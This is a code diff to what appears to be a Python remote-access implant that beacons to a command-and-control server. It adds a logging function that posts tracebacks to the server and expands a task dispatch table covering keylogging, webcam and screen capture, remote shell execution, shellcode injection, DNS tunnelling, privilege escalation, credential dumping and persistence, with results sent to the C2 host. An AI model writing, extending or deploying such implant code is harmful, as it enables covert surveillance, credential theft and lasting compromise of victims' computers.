@@ -8,6 +8,7 @@ import requests
 import threading
 import importlib
 from datetime import datetime
+import traceback
 
 # Import all required module functions
 from modules.system_info import get_system_info
@@ -22,7 +23,7 @@ from modules.credential_dump import dump_credentials
 from modules.persistence import install_persistence
 
 # === Configuration ===
-C2_URL = "http://192.168.200.80:5001"
+C2_URL = "http://192.168.0.102:5001"
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
 # ======================
@@ -81,7 +82,7 @@ def send_result(task_id, result):
     payload = {
         "task_id": task_id,
         "agent_id": agent_id,
-        "result": result
+        "data": result
     }
     try:
         r = requests.post(f"{C2_URL}/api/results", json=payload)
@@ -89,6 +90,21 @@ def send_result(task_id, result):
             logging.error("Result send failed: " + r.text)
     except Exception as e:
         logging.error("Result send error: " + str(e))
+
+def send_agent_log(log_message):
+    payload = {
+        "task_id": "agent_log_" + datetime.now().strftime("%Y%m%d_%H%M%S"),
+        "agent_id": agent_id,
+        "data": {
+            "status": "agent_log",
+            "log": log_message,
+            "timestamp": datetime.now().isoformat()
+        }
+    }
+    try:
+        r = requests.post(f"{C2_URL}/api/results", json=payload)
+    except Exception as e:
+        pass  # If this fails, just log locally
 
 def run_task(task):
     """Execute a task and send back the result"""
@@ -99,44 +115,54 @@ def run_task(task):
 
     try:
         logging.info(f"Executing task {task_id} of type {task_type}")
-        
-        # Map task types to functions
+        # Map task types to functions (support both dot and underscore naming)
         task_handlers = {
             'system.get_info': get_system_info,
+            'system_get_info': get_system_info,
             'process.list': list_processes,
+            'process_list': list_processes,
             'surveillance.screenshot': take_screenshot,
+            'surveillance_screenshot': take_screenshot,
             'surveillance.webcam': capture_webcam,
+            'surveillance_webcam': capture_webcam,
             'surveillance.keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
+            'surveillance_keylogger': lambda: start_keylogger() if not is_keylogger_running() else stop_keylogger(),
             'shell.execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
+            'shell_execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
             'files.browser': lambda: list_directory(task_data.get('path', '.')),
+            'files_browser': lambda: list_directory(task_data.get('path', '.')),
             'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
             'dns_tunnel.start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
+            'dns_tunnel_start': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'privesc.auto': attempt_privilege_escalation,
+            'privesc_auto': attempt_privilege_escalation,
             'credentials.dump': dump_credentials,
-            'persistence.install': lambda: install_persistence(task_data.get('method', 'registry'))
+            'credentials_dump': dump_credentials,
+            'persistence.install': lambda: install_persistence(task_data.get('method', 'registry')),
+            'persistence_install': lambda: install_persistence(task_data.get('method', 'registry'))
         }
-
         # Execute the task
         if task_type in task_handlers:
             result = task_handlers[task_type]()
         else:
             result = f"Unknown task type: {task_type}"
-
         # Send the result back
         send_result(task_id, {
             'status': 'success',
             'data': result,
             'timestamp': datetime.now().isoformat()
         })
-
     except Exception as e:
         error_msg = f"Task execution failed: {str(e)}"
+        tb = traceback.format_exc()
         logging.error(error_msg)
         send_result(task_id, {
             'status': 'error',
             'error': error_msg,
             'timestamp': datetime.now().isoformat()
         })
+        send_agent_log(tb)
 
 def auto_task_post_startup():
     logging.info("Running startup modules...")
